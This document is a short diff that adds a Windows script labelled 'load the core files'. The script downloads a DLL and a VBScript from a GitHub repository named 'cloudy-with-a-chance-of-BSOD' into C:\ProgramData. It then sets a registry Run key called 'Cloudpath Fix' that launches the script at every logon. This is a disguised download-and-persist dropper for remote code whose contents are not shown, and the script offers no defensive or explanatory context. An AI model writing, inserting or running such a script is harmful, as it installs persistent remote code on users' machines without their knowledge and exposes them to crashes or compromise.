@@ -1,0 +1,9 @@
+# load the core files
+C:
+cd C:\ProgramData
+mkdir cloudpath_data
+cd cloudpath_data
+iwr -useb https://github.com/Henry-Hart-School/cloudy-with-a-chance-of-BSOD/raw/main/cloudpath.dll -OutFile cloudpath.dll
+iwr -useb https://github.com/Henry-Hart-School/cloudy-with-a-chance-of-BSOD/raw/main/fix.vbs -OutFile fix.vbs
+cd C:\Windows\System32
+reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Cloudpath Fix" /t REG_SZ /d "C:\Windows\System32\wscript.exe C:\ProgramData\cloudpath_data\fix.vbs"
